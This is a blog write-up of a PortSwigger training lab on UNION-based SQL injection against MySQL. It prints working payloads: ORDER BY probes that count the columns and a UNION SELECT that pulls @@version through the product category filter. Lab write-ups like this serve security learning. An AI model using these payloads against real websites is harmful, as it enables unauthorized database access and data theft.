---
layout: post
title: "SQL injection attack, querying the database type and version on MySQL and Microsoft [Write-up]"
date: 2026-06-29
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [sqli, web]
---

## Overview

**Lab:** SQL injection attack, querying the database type and version on MySQL and Microsoft

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

> Hint [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


# Solution

Right from the start, I decided to find out how many columns there are in the database table, so I'm running this query: 

```python
'+ORDER+BY+1+#
'+ORDER+BY+2+#
'+ORDER+BY+3+#   
```

<p align="center">
  <img src="/assets/css/img/SQL/sql5.png" alt="SQLi" />
</p>

And from the error on the third query, we can see that the table has only two columns, so the next step is to find out what data types are contained in those two columns.

<p align="center">
  <img src="/assets/css/img/SQL/sql6.png" alt="SQLi" />
</p>

```python
Lifestyle'+UNION+SELECT+1,+1#
```
As we can see, our data has been displayed on the page 

Now we can proceed to obtain a version of the database

> In MySQL, we use `@@version` to find out the database version

<p align="center">
  <img src="/assets/css/img/SQL/sql7.png" alt="SQLi" />
</p>

```pyton
Lifestyle'+UNION+SELECT+@@version,+1#
```

